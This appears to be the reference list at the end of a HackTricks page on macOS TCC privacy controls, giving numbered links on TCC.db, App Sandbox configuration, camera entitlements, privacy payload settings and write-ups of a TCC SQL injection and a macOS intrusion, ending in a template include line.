- [6] [TCC 中的 SQL Injection：以及它为何（可能）不构成安全风险（这次）](https://wts.dev/posts/tcc-sql-injection/)
- [7] [macOS 上 TCC.db 的位置与获取](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [配置 macOS App Sandbox](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Camera entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Apple 设备的隐私偏好策略控制设备管理负载设置](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [剖析一次 macOS 入侵：从诱饵到失陷](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
